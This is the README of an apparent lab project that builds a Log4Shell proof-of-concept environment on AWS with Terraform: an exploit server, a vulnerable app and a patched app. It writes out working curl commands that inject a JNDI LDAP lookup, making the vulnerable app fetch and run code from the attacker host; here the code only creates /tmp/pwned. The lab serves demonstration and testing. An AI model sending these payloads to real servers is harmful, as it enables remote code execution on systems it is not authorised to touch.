# terraform-log4shell

Log4Shell POC Using Terraform

# About

This terraform creates three instances on a VPC in AWS Cloud:

- [jndiexploit](https://github.com/feihong-cs/JNDIExploit)
- [log4shellapp](https://github.com/christophetd/log4shell-vulnerable-app)
- [fixedapp](https://github.com/christophetd/log4shell-vulnerable-app)

Please ensure that you have configured aws cli with your Access key ID and Secret access key.
In order to ssh into the ec2 instances, please update ssh public key in terraform before running terraform apply

```bash
terraform init
terraform plan
terraform apply --auto-approve
```

# Exploitation (Remote Code Execution) Steps

_Note: This is highly inspired from the original [LunaSec advisory](https://www.lunasec.io/docs/blog/log4j-zero-day/). **Run at your own risk**._

- Trigger the exploit using:

```bash
curl ${log4shellapp-ip}:8080 -H 'X-Api-Version: ${jndi:ldap://${jndiexploit-ip}:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'

curl ${fixedapp-ip}:8080 -H 'X-Api-Version: ${jndi:ldap://${jndiexploit-ip}:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
```

- To confirm that the code execution was successful on log4shellapp, notice that the file `/tmp/pwned` was created in log4shellapp's container: ssh into log4shellapp ec2 instance using your private key and run:

```bash
sudo docker exec -ti log4shellapp ls /tmp
...
pwned
...
```

- To confirm that the code execution was unsuccessful on fixedapp, notice that NO file `/tmp/pwned` was created in fixedapp's container: ssh into fixedapp ec2 instance using your private key and run:

```bash
sudo docker exec -ti fixedapp ls /tmp
...
...
```

## Reference

- https://www.lunasec.io/docs/blog/log4j-zero-day/
- https://bigb0ss.medium.com/appsec-log4shell-cve-2021-44228-606f91e56866
- https://chasersystems.com/blog/log4shell-and-its-traces-in-a-network-egress-filter/
